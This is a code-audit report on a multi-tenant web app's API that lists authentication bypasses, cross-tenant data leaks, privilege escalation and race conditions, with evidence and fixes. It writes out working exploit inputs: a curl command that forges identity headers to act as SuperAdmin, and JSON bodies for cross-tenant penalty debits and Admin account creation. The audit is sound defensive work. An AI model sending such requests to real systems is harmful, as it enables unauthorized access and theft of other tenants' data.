# Audit 04 — API Contract & Correctness (non-finance surface)

**Scope:** `app/api/{members,goals,meetings,projects,governance,reports,settings,analytics,auth,audit,expenses}/**` (40 route files) + `lib/utils/{errors,validation,audit,types,jwt,cookies,password}.ts`, `lib/token-expiry.ts`, `lib/api-client.ts`, `lib/middleware/auth.ts`, `middleware.ts`, and the legacy kernel that live routes delegate to (`server/src/modules/members/handlers.ts`, `server/src/modules/{members,projects}/service.ts`, `server/src/middleware/api.ts`, `server/src/lib/session.ts`).
**Out of scope (other auditors):** `app/api/finance|dividends|deposits|funds|transactions`, `app/api/backup`, `.github/`, `components/**`, `lib/money.ts`, `lib/shares.ts`.
**Method:** every route in scope read line-by-line. Baseline toolchain green (`tsc --noEmit`, `next lint`, vitest 69/69) — all findings below are semantic and survive type-checking. Dead-endpoint list produced by scanning `app|components|hooks|lib` for every `/api/*` literal and diffing against the 70 real route files.

---

## Summary

| Severity | Count |
| --- | --- |
| Critical | 8 |
| High | 17 |
| Medium | 18 |
| Low | 9 |
| **Total** | **52** |

Headline: the shared authentication helper `getAuthContext()` is bypassable by three request headers, and **the dominant systemic defect is a missing `tenantId` predicate** — 12 of the 40 in-scope route files query a table that *has* a `tenantId` column without filtering on it, and 4 more write rows without ever setting it. Every one of those is a cross-tenant read or write.

---

## Endpoint matrix

| Route | Methods | Validation | Error handling | Auth guard | Idempotent | Verdict |
| --- | --- | --- | --- | --- | --- | --- |
| `/api/members` | GET | Zod (legacy) | legacy `{success,message,code}` | `requireSession`+`requireTenant` | n/a | OK (shape differs from POST) |
| `/api/members` | POST | inline checks | `{success,message}` 500 + `err.message` | `requirePermission(MEMBERS,WRITE)` | **No** (TOCTOU → 500) | ⚠ |
| `/api/members/[id]` | GET | id regex | `errJson` → leaks `err.message` | `MEMBERS:READ` | n/a | ⚠ PII leak |
| `/api/members/[id]` | PUT | partial | `errJson` | `MEMBERS:WRITE` | idempotent | ⚠ role allowlist missing |
| `/api/members/[id]` | DELETE | n/a | `errJson` | `MEMBERS:WRITE` | idempotent | ⚠ hard delete |
| `/api/goals` | GET | none | leaks `err.message` | **none beyond auth** | n/a | ✗ no tenant filter, unbounded |
| `/api/goals` | POST | 2 inline checks | leaks `err.message` | **none beyond auth** | **No** | ✗ `tenantId` never written |
| `/api/goals/[id]` | GET | none | leaks `err.message` | **none** (no ownership) | n/a | ✗ IDOR |
| `/api/goals/[id]` | PUT | none | leaks `err.message` | `!== 'Member'` only | idempotent | ✗ any non-Member edits any goal |
| `/api/goals/[id]` | DELETE | none | leaks `err.message` | raw `role==='Admin'` | idempotent | ✗ hard delete |
| `/api/meetings` | GET | none | leaks `err.message` | auth only | n/a | ✗ no tenant filter, unbounded `limit` |
| `/api/meetings` | POST | 3 inline checks | leaks `err.message` | `!== 'Member'` | **No** | ✗ Auditor can schedule |
| `/api/meetings/[id]` | GET | none | leaks `err.message` | **none** | n/a | ✗ no tenant filter, no permission check |
| `/api/meetings/[id]` | PUT | none | leaks `err.message` | `!== 'Member'` | idempotent | ✗ no tenant filter |
| `/api/meetings/[id]` | DELETE | n/a | leaks `err.message` | Admin/Manager/SuperAdmin | idempotent | ✗ cascades attendance away |
| `/api/meetings/[id]/attendance` | POST | array check | leaks `err.message` | `!== 'Member'` | **No** | ✗ `warningCount` inflates per call |
| `/api/projects` | GET | **none** | legacy | `requireSession` only | n/a | ✗ **no `requireTenant`** |
| `/api/projects/[id]` | GET | none | leaks `err.message` | auth only | n/a | ✗ no tenant filter |
| `/api/projects/[id]` | PUT | none | leaks `err.message` | `!== 'Member'` | idempotent | ✗ no tenant filter, free-text `status` |
| `/api/projects/[id]` | DELETE | n/a | leaks `err.message` | Admin/Manager/SuperAdmin | idempotent | ⚠ soft-cancels, 200 on DELETE |
| `/api/projects/[id]/updates` | POST | good (positive amount) | leaks `err.message` | `!== 'Member'` | **No** | ✗ lost update, no row lock |
| `/api/governance/penalties` | GET | none | leaks `err.message` | **none** | n/a | ✗ no tenant filter, no permission check |
| `/api/governance/penalties` | POST | 3 inline checks | leaks `err.message` | `!== 'Member'` | **No** | ✗ cross-tenant balance debit |
| `/api/governance/penalties/[id]/waive` | POST | good (reason required) | leaks `err.message` | Admin/Manager/SuperAdmin | **Yes** (400 on re-waive) | ✗ no tenant filter; 400 should be 409 |
| `/api/governance/rules` | GET | none | leaks `err.message` | auth only | n/a | ✗ global settings; dead endpoint |
| `/api/reports/generate/[type]` | GET | none | leaks `err.message` | auth only | n/a | ✗ **cross-tenant PII export** |
| `/api/reports/export-generic` | POST | array check | leaks `err.message` | auth only (**no REPORTS perm**) | n/a | ✗ dead, unbounded |
| `/api/settings` | GET | n/a | `{success,message,code}` | auth only | **writes!** | ✗ bare shape, GET mutates |
| `/api/settings` | PUT | **Zod `.safeParse`, checked** | `{success,message,code}` | custom `hasSettingsWritePermission` | idempotent | ✗ **no audit**, global row, lock bypass |
| `/api/settings/share-value-status` | GET | n/a | `{success,message,code}` | auth only | **writes!** | ✗ dead duplicate of `GET /api/settings` |
| `/api/analytics/stats` | GET | none | leaks `err.message` | auth only | n/a | ✗ **fabricated fallback numbers** |
| `/api/analytics/analysis` | GET | none | leaks `err.message` | auth only | n/a | ✗ unbounded read, bare shape |
| `/api/auth/login` | POST | 2 inline checks | `{success,message,code}` | public | n/a | ⚠ email-only lockout, tokens in body |
| `/api/auth/refresh` | POST | n/a | `{success,message,code}` | public | **rotates** (no reuse detection) | ⚠ old access token survives |
| `/api/auth/logout` | POST | n/a | `{success,message,code}` | auth required | idempotent | ✗ **swallows blacklist failure → 200** |
| `/api/auth/logout-all` | POST | n/a | `{success,message,code}` | auth required | idempotent | ✗ **no token revocation at all** |
| `/api/auth/register` | POST | inline checks | `{success,message,code}` | Admin/SuperAdmin | **No** | ✗ **`tenantId` never set** |
| `/api/auth/forgot-password` | POST | email presence only | `{success,message}` | public | n/a | ⚠ **no token, no email** |
| `/api/auth/me` | GET | n/a | `{success,message,code}` | auth required | n/a | ⚠ bare shape, dead |
| `/api/auth/users` | GET | none | `{success,message,code}` | Admin/Manager/SuperAdmin | n/a | ✗ **whole-platform user dump** |
| `/api/auth/sessions` | GET | n/a | `{success,message,code}` | auth required (own rows) | n/a | ⚠ bare-ish, dead, unbounded |
| `/api/auth/sessions/[sessionId]` | DELETE | none | `{success,message,code}` | auth required (own row) | **No** | ✗ **revocation not enforced**, no audit |
| `/api/auth/login-history` | GET | n/a | `{success,message,code}` | auth required (own email) | n/a | ✅ scoped; dead endpoint |
| `/api/auth/profile/password` | PUT | strength check | `{success,message,code}` | auth required | idempotent | ✗ **no session invalidation, no audit** |
| `/api/audit` | GET | `getPaginationParams` (limit≤100) | `{success,message,code}` | Admin/Manager/SuperAdmin | n/a | ✗ **no tenant filter** |
| `/api/audit/metadata` | GET | none | `{success,message,code}` | Admin/Manager/SuperAdmin | n/a | ✗ bare shape, no tenant filter, dead |
| `/api/audit/notifications` | GET | none | `{success,message,code}` | Admin/Manager/SuperAdmin | n/a | ✗ bare array, no tenant filter, dead |
| `/api/expenses` | GET | none | leaks `err.message` | `hasScreenPermission(EXPENSES,READ)` | n/a | ⚠ unbounded `limit` |
| `/api/expenses` | POST | good (2dp, positive, fund active) | leaks `err.message` | `hasScreenPermission(EXPENSES,WRITE)` | **advisory only** | ⚠ fail-open tenant, lost update |

---

## Findings

### [API-001] Every authenticated route is bypassable with three request headers — Severity: Critical

- **Location:** `lib/middleware/auth.ts:452-481` (reached from **all 40** in-scope routes), `middleware.ts:47-55`
- **Evidence:**

```ts
// lib/middleware/auth.ts:447
export async function getAuthContext(request: NextRequest): Promise<{...}> {
  const userId = request.headers.get('x-user-id');
  if (userId) {
    const role = normalizeRole(request.headers.get('x-user-role') || 'Member');
    const tenantId = request.headers.get('x-tenant-id');
    const email = request.headers.get('x-user-email') || '';
    const permissionsHeader = request.headers.get('x-user-permissions');
    let permissions: Record<string, string> = {};
    if (permissionsHeader) {
      try { permissions = JSON.parse(permissionsHeader); } catch {}
    }
    return {
      user: { id: userId, tenantId, name: ..., email, role, status: 'active', permissions, ... },
      tenantId,
    };
  }
  const { user, tenant, error } = await authenticateRequest(request);   // never reached
```

The header short-circuit returns **before** `authenticateRequest()` — no signature check, no blacklist check, no `users.status` check, no DB read. `x-user-id` appears nowhere else in the repository except this read (verified by grep: the only 4 hits are lines 452/454/455/456/457 here); `middleware.ts` neither sets nor strips it.

The only remaining obstacle is the middleware presence check:

```ts
// middleware.ts:46-50
  // APIs: presence check only (historic behavior); route handlers verify.
  if (pathname.startsWith('/api/')) {
    if (request.cookies.has(ACCESS_COOKIE)) {
      return NextResponse.next();
    }
```

`ACCESS_COOKIE` presence is the whole test — any value passes.

- **Impact:** `curl -H 'Cookie: accessToken=x' -H 'x-user-id: <any-uuid>' -H 'x-user-role: SuperAdmin' https://host/api/settings` with **no credentials at all** reaches every handler in scope as SuperAdmin: rewrite org-wide settings, issue penalties that debit member balances, create members, export every tenant's ledger. `x-user-permissions: '{"SETTINGS":"WRITE"}'` grants any single screen to a Member. Omitting `x-tenant-id` also nulls `tenantId`, which several routes treat as "no filter" (API-005, API-014), so the bypass doubles as a cross-tenant read. This is an unauthenticated state change on the entire surface.
- **Fix:** delete the `x-user-*` branch entirely and always call `authenticateRequest`. If a trusted upstream genuinely injects identity, gate it behind a shared secret (or better, a signed internal JWT verified here) and delete the headers at the edge in `middleware.ts`:
  ```ts
  const h = new Headers(request.headers);
  for (const k of ['x-user-id','x-user-role','x-user-tenant-id','x-user-email','x-user-permissions','x-user-name','x-user-member-id']) h.delete(k);
  ```
  Also tighten `middleware.ts:48` from presence to a signature check, and drop the `pathname.includes('.')` early return at line 34 which skips the API branch entirely for any path containing a dot (e.g. `/api/reports/generate/a.b`).

---

### [API-002] `GET /api/auth/users` returns the entire platform user directory — Severity: Critical

- **Location:** `app/api/auth/users/route.ts:62-65`
- **Evidence:**

```ts
    const db = getDb();
    const rows = await db
      .select(USER_SELECT)
      .from(users)
      .orderBy(desc(users.createdAt));

    return NextResponse.json(rows.map(toUserResponse));
```

`users.tenantId` exists (`db/schema/users.ts:6`, `idx_users_tenant`) and is never referenced. `USER_SELECT` (lines 9-21) includes `email`, `role`, `status`, `permissions` and `memberId`; `toUserResponse` (23-44) passes `permissions` through verbatim.

The in-repo convention is the opposite — `server/src/modules/members/service.ts:55-59`:

```ts
  if (!tenantId) {
    throw new AppError('Tenant context required', 403, 'TENANT_REQUIRED');
  }
  const conditions: (SQLWrapper | undefined)[] = [eq(members.tenantId, tenantId)];
```

- **Impact:** a Manager of tenant A receives the name, email, role, status, last-login and full permission map of every user in every tenant. That is a cross-tenant PII leak plus a reconnaissance dump: it tells an attacker exactly which accounts are `Admin` and which screens each one can write.
- **Fix:** `.where(and(eq(users.tenantId, authUser.tenantId), ...))`, throw 403 when `tenantId` is null (platform operators use `/api/admin/tenants`), add `.limit()` with a `page` param, and drop `permissions` from the response.

---

### [API-003] `GET /api/reports/generate/[type]` exports every tenant's member PII and ledger — Severity: Critical

- **Location:** `app/api/reports/generate/[type]/route.ts:42` (`tenantId` destructured, never used), branches at `:73`, `:109`, `:138`, `:173`
- **Evidence:**

```ts
    const { user, tenantId, error } = await getAuthContext(request);   // line 42 — tenantId unused below
...
      const rows = await db
        .select({ ... email: members.email, phone: members.phone, ... })   // line 113-114
        .from(members)
        .orderBy(asc(members.name));                                        // line 122 — no .where()
```

Four branches (`transactions` 86-92, `members` 121-122, `projects` 153-154, `memberPenalties` 188-190) each query a tenant-scoped table with **no `.where()` at all**. There is no `requirePermission` either — the legacy equivalent has one: `server/src/modules/reports/routes.ts:8` `requirePermission('REPORTS', 'READ')`.

- **Impact:** any authenticated Member (REPORTS:READ is in the Member baseline, `lib/roles.ts:56`) can download, as CSV, every member's name/email/phone in the platform plus every transaction, project balance and penalty record. The `member` branch exports exactly the two fields that `server/src/modules/members/service.ts:91` deliberately masks for non-admins.
- **Fix:** add `eq(table.tenantId, tenantId)` to all four branches, require `requirePermission('REPORTS','READ')`, throw 403 on a null `tenantId`, and reject `format !== 'csv'` instead of silently ignoring it (`:51`).

---

### [API-004] `GET /api/projects` returns every project of every tenant — Severity: Critical

- **Location:** `app/api/projects/route.ts:7` → `server/src/modules/members/handlers.ts:104-114` → `server/src/modules/projects/service.ts:7-33`
- **Evidence:**

```ts
// server/src/modules/members/handlers.ts:104
export async function handleListProjects(request: NextRequest) {
  try {
    await requireSession();                                  // ← result discarded, no requireTenant()
    const url = new URL(request.url);
    const fundId = url.searchParams.get('fundId') || undefined;
    const status = url.searchParams.get('status') || undefined;
    const result = await projectsService.listProjects({ fundId, status });
    return Response.json(result);
```

Compare the two sibling handlers in the same file — `handleListMembers:34` and `handleListFunds:56` both call `requireTenant(user)` with the comment *"Fail-closed tenant resolution: platform operators must use /api/admin."* `handleListProjects` omits it.

```ts
// server/src/modules/projects/service.ts:10-12, 28-32
  const conditions = [];
  if (query?.status) conditions.push(eq(projects.status, query.status));
  if (query?.fundId) conditions.push(eq(projects.linkedFundId, query.fundId));
  ...
    .where(conditions.length > 0 ? and(...conditions) : undefined)
    .limit(500);
  return { data: rows, total: rows.length };      // total is the capped slice length
```

- **Impact:** with no filter params, `whereClause` is `undefined` → every project row on the platform, with `budget`, `totalEarnings`, `totalExpenses` and `currentFundBalance`. Also no Zod query validation (unlike `listMembersQuerySchema:17`), and `total` reports `rows.length` capped at 500 rather than the real count.
- **Fix:** add `requireTenant(user)` in `handleListProjects` and `tenantId` to `listProjects`'s conditions; validate `fundId`/`status` with a Zod schema; compute `total` with a separate `count(*)`; add pagination.

---

### [API-005] Settings are a single global row — any Admin rewrites every tenant's financial config — Severity: Critical

- **Location:** `app/api/settings/route.ts:113`, `:181`, `:60-76`, `:117`, `:183`; `app/api/governance/rules/route.ts:14-17`; `app/api/settings/share-value-status/route.ts:25`, `:41-43`; `app/api/governance/penalties/route.ts:130`
- **Evidence:** `db/schema/system_settings.ts` defines `tenantId: uuid('tenant_id').references(() => tenants.id).unique()`. Every query in the six call sites above is:

```ts
// app/api/settings/route.ts:113
    const [settings] = await db.select().from(systemSettings).limit(1);
```

No `.where()`, and lines 117/183 `db.insert(systemSettings).values({})` create the row with `tenantId = NULL`. The same unscoped `limit(1)` is how `penalties/route.ts:130` picks the penalty rules applied to a new penalty.

- **Impact:** `PUT /api/settings` from tenant A's Admin changes `companyName`, `taxRate`, `shareValueBdt`, `penaltyRules` and `isMaintenanceMode` for every tenant on the platform. A cross-tenant **write** of financial configuration.
- **Fix:** add `eq(systemSettings.tenantId, tenantId)` to all six sites, throw when `tenantId` is null, and delete the `values({})` auto-create path (or set `tenantId`). Reserve a `tenantId IS NULL` row for genuine platform defaults and read it only as a fallback.

---

### [API-006] `POST /api/auth/register` creates a tenant-less Admin — privilege escalation — Severity: Critical

- **Location:** `app/api/auth/register/route.ts:120-136`
- **Evidence:**

```ts
    const newRole = normalizeRole(role);
    if (isSuperAdminRole(newRole)) {
      throw new ForbiddenError('SuperAdmin accounts cannot be created here');
    }

    const [created] = await db
      .insert(users)
      .values({
        name,
        email: normalizedEmail,
        password: hashed,
        role: newRole,
        memberId: memberId || null,
        permissions: (permissions && Object.keys(permissions).length > 0
          ? permissions
          : getDefaultPermissions(newRole)) as Record<string, string>,
      })
```

`tenantId` is **never set** on the insert, and `permissions` is stored **verbatim from the request body** with no allowlist on keys or values. Only `SuperAdmin` is blocked; `Admin` is accepted, and `getDefaultPermissions('Admin')` (lines 32-41) grants `WRITE` on all 15 screens.
- **Impact:** any tenant Admin can POST `{"role":"Admin","permissions":{"SETTINGS":"WRITE"}}` and mint a **platform-scope** Admin (`tenantId IS NULL`) with arbitrary screen grants — self-service privilege escalation out of the tenant boundary. It is also unauthenticated in effect: the call succeeds with no valid token because of API-001.
- **Fix:** set `tenantId: authUser.tenantId`; reject the body when the caller's tenant differs; validate `permissions` against `ALL_SCREENS` × `{WRITE,READ,NONE}`; drop the `permissions` passthrough entirely and derive it from the role.

---

### [API-007] `POST /api/governance/penalties` debits a member of any tenant — Severity: Critical

- **Location:** `app/api/governance/penalties/route.ts:121-125`, `:158-163`, `:167-174`
- **Evidence:**

```ts
      const [member] = await tx
        .select()
        .from(members)
        .where(eq(members.id, memberId))          // ← no tenant predicate
        .limit(1);
      if (!member) throw new NotFoundError('Member');
...
            const [defaultFund] = await tx
              .select({ id: funds.id })
              .from(funds)
              .where(eq(funds.status, 'ACTIVE'))   // ← no tenant predicate
              .limit(1);
...
          await tx
            .update(members)
            .set({
              totalContributed: sql<string>`GREATEST(0, (${members.totalContributed}::numeric - ${calculatedDeduction}))::numeric(15,2)`,
```

`memberId` and `fundId` are taken from the body and never checked against `tenantId` (which is destructured at line 101 and never used). `isPercentage` and `deductionAmount` are also client-controlled (lines 142-143).
- **Impact:** a Manager of tenant A issues `{"memberId":"<tenant-B-member>","tier":2,"type":"FUND_DEDUCTION","isPercentage":true,"deductionAmount":100,"reason":"x"}` and zeroes that member's `totalContributed` cross-tenant. No ledger row is written for the deduction, so `members.totalContributed` permanently diverges from the sum of `transactions` (and `waive` later "restores" a balance that was never recorded).
- **Fix:** add `eq(members.tenantId, tenantId)` and `eq(funds.tenantId, tenantId)`; reject a body-supplied `fundId` that is not in the tenant; take `type`/`isPercentage`/`deductionAmount` from `systemSettings.penaltyRules` rather than the request; write a `transactions` row for the deduction.

---

### [API-008] `POST /api/auth/logout` swallows the revocation failure and returns 200 — Severity: Critical

- **Location:** `app/api/auth/logout/route.ts:36-50`, success return at `:74-77`
- **Evidence:**

```ts
    if (refreshToken) {
      try {
        const expiry = getTokenExpiry(refreshToken);
        await db.insert(blacklistedTokens).values({ token: refreshToken, type: 'refresh', userId, expiresAt: expiry, reason: 'logout' });
        blacklistToken(refreshToken, expiry);
      } catch {
        // If the token is malformed we still proceed to end the session
      }
    }
...
    const response = NextResponse.json({ success: true, message: 'Logged out successfully' });
```

A DB outage, a constraint violation, or a token whose `getTokenExpiry` fallback (`lib/token-expiry.ts:16`, 7 days) is used all land in the empty `catch`. The handler then reports success.
- **Impact:** the user is told they logged out; the refresh token is still valid for up to **7 days** (`lib/utils/jwt.ts:5`, `REFRESH_TOKEN_EXPIRY = '7d'`) and the access token for 15 minutes. The one mutation whose whole purpose is revocation silently succeeds when it fails. (Per the severity bar, a swallowed error returning success on a mutation.)
- **Fix:** do not catch — let the insert failure propagate to the outer handler, which already maps unknown errors to a 500; or, if the token is genuinely malformed, distinguish that case (verify the signature first) and only then continue. Also blacklist the **access** token, and record the outcome in `logAudit` with `status: 'FAILURE'` on the error path.

---

### [API-009] Goals are global: no tenant filter on read, `tenantId` never written — Severity: High

- **Location:** `app/api/goals/route.ts:12`, `:26-28`, `:41-60`, `:91-103`; `app/api/goals/[id]/route.ts:41`, `:81`, `:156`
- **Evidence:**

```ts
// app/api/goals/route.ts:12
    const { user, error } = await getAuthContext(request);   // tenantId not destructured
...
    if (normalizeRole(user.role) === 'Member') {             // line 26
      conditions.push(sql`${goals.userId} = ${user.id}`);
    }
...
      .insert(goals)
      .values({ userId: user.id, title: title.trim(), ... }) // lines 93-103 — no tenantId
```

`goals.tenantId` exists (`db/schema/goals.ts:8`, `idx_goals_tenant`) and is never written or filtered. A `Manager`/`Auditor` (any role that is not `Member`) therefore sees every goal row on the platform.
- **Impact:** cross-tenant read of every member's goals (title, target amount, current amount, deadline) for any Manager/Auditor; and every new goal is written with `tenant_id = NULL`, so it can never be scoped later even if the read is fixed.
- **Fix:** destructure `tenantId`, push `eq(goals.tenantId, tenantId)` unconditionally, set `tenantId` on insert, and use `requirePermission('GOALS','READ')` instead of the inline role comparison.

---

### [API-010] `GET /api/goals/[id]` is an unauthenticated-owner IDOR; PUT/DELETE use three different policies — Severity: High

- **Location:** `app/api/goals/[id]/route.ts:15-42` (GET), `:81` (PUT), `:156` (DELETE)
- **Evidence:**

```ts
// GET — no ownership or role check at all, only `if (!user)`
      .where(eq(goals.id, id))
      .limit(1);
    if (!goal) throw new NotFoundError('Goal');
...
// PUT
    if (existing.userId !== user.id && normalizeRole(user.role) === 'Member') {
      throw new ForbiddenError('You can only update your own goals');
    }
// DELETE
    if (existing.userId !== user.id && user.role !== 'Admin' && user.role !== 'Administrator') {
```

Three different rules in one file: GET has none, PUT lets every non-`Member` edit anyone's goal, DELETE compares the **raw** `user.role` string instead of `normalizeRole` (the rest of the codebase normalizes — `lib/roles.ts:34`) so a `Manager` can PUT but not DELETE, and a role stored as `admin`/`ADMIN` is denied.
- **Impact:** any authenticated user of any tenant reads any goal by UUID (`lib/roles.ts:40` maps `investor`/`associate member`/`viewer` to `Member`, so the PUT check is the only thing standing between an ordinary member and other members' goals — and it does not apply to GET).
- **Fix:** one shared `assertCanAccessGoal(user, goal, 'read'|'update'|'delete')` helper using `normalizeRole` **and** `eq(goals.tenantId, user.tenantId)`; DELETE by `requirePermission('GOALS','WRITE')` + ownership.

---

### [API-011] Meetings: no tenant filter anywhere, and the detail route has no permission check — Severity: High

- **Location:** `app/api/meetings/route.ts:26-38` (GET), `:110-123` (POST), `app/api/meetings/[id]/route.ts:23-58`, `app/api/meetings/[id]/attendance/route.ts:34-38`, `:87`
- **Evidence:** `app/api/meetings/route.ts` builds `conditions` from `status`/`meetingType`/`search` only (28-36) and inserts without `tenantId` (112-122). `app/api/meetings/[id]/route.ts:15-42` has no `requirePermission` and no tenant predicate; the attendance route at `:34-38` looks the meeting up by id alone.
- **Impact:** every meeting, its agenda/notes and its attendee roster (member name + member code) is readable by any authenticated user of any tenant. The POST path is the mirror image: it is the only place that checks a role, and it checks `!== 'Member'`, which **an `Auditor` passes** — yet `lib/roles.ts:67` defines Auditor as read-only for every screen. A read-only auditor can schedule meetings and record attendance.
- **Fix:** tenant predicate on all five handlers + `tenantId` on insert; replace the `!== 'Member'` checks in `meetings/route.ts:97`, `meetings/[id]/route.ts:86`, `attendance/route.ts:20`, `projects/[id]/route.ts:76` and `projects/[id]/updates/route.ts:20` with `requirePermission('MEETINGS'|'PROJECT_MANAGEMENT', 'WRITE')`.

---

### [API-012] `POST /api/meetings/[id]/attendance` inflates `warningCount` on every call and writes cross-tenant — Severity: High

- **Location:** `app/api/meetings/[id]/attendance/route.ts:57-88`
- **Evidence:**

```ts
        if (existing) {
          await tx.update(meetingAttendees).set({ attendanceStatus, depositStatus, notes, updatedAt: new Date() })
            .where(eq(meetingAttendees.id, existing.id));
        } else { ...insert... }

        // If unexcused absence, increment member's warning count
        if (attendanceStatus === 'ABSENT') {
          await tx.update(members)
            .set({ warningCount: sql<number>`COALESCE(${members.warningCount}, 0) + 1`, updatedAt: new Date() })
            .where(eq(members.id, item.memberId));        // ← no tenant predicate
        }
```

The increment sits **outside** the `if (existing)` branch, so re-submitting the same roster — the normal outcome of a double-clicked Save or a React 18 double-invoked effect — adds another strike each time. It is not reversed when a member is later marked PRESENT, nor when the meeting is deleted (API-013).
- **Impact:** `warningCount` is a governance counter: `app/governance/penalties` uses it to justify tier escalation, and it is persisted with no record of which meeting caused it. A member can be pushed into a penalty tier by accidental double-submits. The `eq(members.id, item.memberId)` also has no tenant check, so a caller can increment the warning count of a member in another tenant (or of a non-existent id, which silently matches nothing).
- **Fix:** move the increment inside `else` (new row only) or make it idempotent by storing the last-applied status on `meetingAttendees` and only incrementing on an `ABSENT` transition; add `eq(members.tenantId, tenantId)`; validate that each `memberId` exists in the tenant; cap `attendeesList.length`.

---

### [API-013] `DELETE /api/meetings/[id]` silently cascades away the whole attendance record — Severity: High

- **Location:** `app/api/meetings/[id]/route.ts:177`; `db/schema/meeting_attendees.ts:9-10`
- **Evidence:**

```ts
    await db.delete(meetings).where(eq(meetings.id, id));
```

```ts
// db/schema/meeting_attendees.ts:9
  meetingId: uuid('meeting_id').references(() => meetings.id, { onDelete: 'cascade' }).notNull(),
  memberId:  uuid('member_id').references(() => members.id,   { onDelete: 'cascade' }).notNull(),
```

The delete succeeds silently and every attendance row goes with it. The `warningCount` increments those absences caused (API-012) are **not** reversed, so the member keeps strikes that reference a meeting that no longer exists anywhere.
- **Impact:** irreversible loss of the attendance/penalty evidence base. The sibling endpoint does the opposite — `app/api/projects/[id]/route.ts:163-171` soft-cancels (`status: 'Cancelled'`) — and `db/schema/deleted_records.ts` exists as a soft-delete table that the live app never writes to (the only writer is `server/src/modules/finance/service.ts:1175`).
- **Fix:** convert meeting deletion to a status transition (or record a `deleted_records` tombstone with the attendance rows in `data`), and reverse the `warningCount` deltas in the same transaction.

---

### [API-014] `GET` and `POST /api/expenses` fail open on a null `tenantId`, and the idempotency check is advisory — Severity: High

- **Location:** `app/api/expenses/route.ts:193`, `:222`, `:243`, `:179-187`, `:206`+`:235-239`
- **Evidence:**

```ts
// :193
      .where(and(eq(funds.id, fundId), tenantId ? eq(funds.tenantId, tenantId) : sql`true`))
// :222  (identical pattern for projects)
// :243
        tenantId: tenantId || null,
```

A null `tenantId` makes the fund/project lookup **global** instead of failing closed, and the created transaction is written with `tenantId: NULL`, permanently orphaning it from every tenant report. The repo's own rule is the opposite (`server/src/modules/members/service.ts:55`).

The "idempotency" guard is a read-then-insert:

```ts
// :178-187
    // Check for duplicate reference number (idempotency)
    const existingExpense = await db.select({ id: transactions.id }).from(transactions)
      .where(and(eq(transactions.referenceNumber, refNumber), eq(transactions.isDeleted, false))).limit(1);
    if (existingExpense.length > 0) { throw new ValidationError('Transaction with this reference number already exists'); }
```

`db/schema/transactions.ts:15` declares `referenceNumber: varchar('reference_number', { length: 255 })` with **no unique index** in the table's index list (lines 35-56). Two concurrent double-submits both pass the check and both insert.

And the balance is a read-modify-write with no row lock — `fund.balance` is read at `:206` *outside* the transaction opened at `:233`, then written as an absolute value at `:238`; `projects.totalExpenses` repeats the pattern at `:263-268`.
- **Impact:** with API-001 (send `x-user-id` and omit `x-tenant-id`) any caller debits any fund on the platform. Independently: a double-submit creates two expenses and double-debits, and two concurrent expenses lose one update while the ledger's `balanceBefore`/`balanceAfter` (`:255-256`) then disagree with `funds.balance`.
- **Fix:** throw 403 when `tenantId` is null instead of `sql\`true\``; add `unique(transactions.reference_number)` (or a partial unique index on `(reference_number) WHERE is_deleted = false`) and let the constraint enforce it; move the balance read inside the transaction and add `.for('update')`, or make the update `sql\`balance = balance - ${amount}\``.
  *(Money-math overlap with the finance auditor: the same fail-open `sql\`true\`` pattern and the same absolute-balance write appear in `app/api/finance/**`.)*

---

### [API-015] `PUT /api/projects/[id]/updates` loses concurrent disbursements — Severity: High

- **Location:** `app/api/projects/[id]/updates/route.ts:39-47`, `:66`, `:71-73`
- **Evidence:**

```ts
      const [project] = await tx.select().from(projects).where(eq(projects.id, id)).limit(1);  // no FOR UPDATE
      if (!project) throw new NotFoundError('Project');
      const balanceBefore = Number(project.currentFundBalance || 0);
      const balanceAfter = type === 'Earning' ? balanceBefore + numericAmount : balanceBefore - numericAmount;
      ...
      const projectUpdateFields: Record<string, unknown> = {
        currentFundBalance: String(balanceAfter),      // absolute, from the read
      };
      if (type === 'Earning') {
        projectUpdateFields.totalEarnings = sql<string>`(${projects.totalEarnings}::numeric + ${numericAmount})::numeric(15,2)`;  // relative
      }
```

Inside one transaction, `currentFundBalance` is written as an **absolute** value derived from a read while `totalEarnings`/`totalExpenses` are **relative** SQL increments. The `SELECT` has no `FOR UPDATE` and the project lookup has no tenant predicate; the `projectUpdates` insert (52-63) never sets `tenantId` although the column exists (`db/schema/projects.ts:37`).
- **Impact:** two concurrent disbursements both read the same `balanceBefore`, the second write wins, and the ledger holds two rows with the same `balanceBefore` — the project balance silently loses one amount. A Manager of tenant A can also post disbursements against tenant B's project.
- **Fix:** `await tx.select().from(projects).where(...).for('update')`, add `eq(projects.tenantId, tenantId)`, write `currentFundBalance: sql\`current_fund_balance + ${signed}\`` so all three columns move the same way, and set `tenantId` on the `projectUpdates` insert.

---

### [API-016] `GET /api/settings` performs an UPDATE, and the share-value lock is client-unlockable — Severity: High

- **Location:** `app/api/settings/route.ts:110`, `:232-239`; `app/api/settings/share-value-status/route.ts:39-46`
- **Evidence:**

```ts
// GET, line 110
    // Auto-lock share value if transactions exist
    await checkAndAutoLockShareValue();
```

```ts
// PUT, lines 231-239
      if (data.financial.shareValueBdt !== undefined) {
        if (currentSettings.isShareValueLocked) {                 // reads the lock from the DB
          throw new LockedError('Share value is locked and cannot be changed');
        }
        updateData.shareValueBdt = String(data.financial.shareValueBdt);
      }
      if (data.financial.isShareValueLocked !== undefined) {
        updateData.isShareValueLocked = data.financial.isShareValueLocked;   // …but lets the client clear it
      }
```

`lib/utils/validation.ts:54` makes `isShareValueLocked` a writable, optional boolean, so the lock has no monotonicity: `PUT {"financial":{"isShareValueLocked":false}}` then `PUT {"financial":{"shareValueBdt":9999}}` both return 200. Meanwhile any GET (a prefetch, a crawler, a monitoring probe) permanently flips the lock via the auto-lock helper.
- **Impact:** the invariant the lock exists to protect — share value is immutable once transactions exist — is defeated in two requests by the same user the lock was written for. And a side-effecting GET means "just looking" can change platform state.
- **Fix:** remove `isShareValueLocked` from `updateSettingsSchema` (make the lock server-derived only, from the existence of transactions); move the auto-lock into a migration/one-off job rather than a GET handler; if a GET must trigger it, make it idempotent and return the resulting state.

---

### [API-017] `PUT /api/settings` writes no audit entry — Severity: High

- **Location:** `app/api/settings/route.ts:147-325` (no `logAudit` import at line 1-8, no call in the handler)
- **Evidence:** the file imports `AuthError, ForbiddenError, LockedError` (line 7) and `updateSettingsSchema` (line 8) but never `logAudit`. The mutation at `:301-305` changes `taxRate`, `shareValueBdt`, `withdrawalLimitPercent`, `statutoryReservePercent` and `isMaintenanceMode` for the whole platform (API-005) and records nothing.
- **Impact:** the audit log is the only security surface an auditor sees (`/api/audit`), and a change to org-wide financial configuration leaves no trace of who made it or what changed.
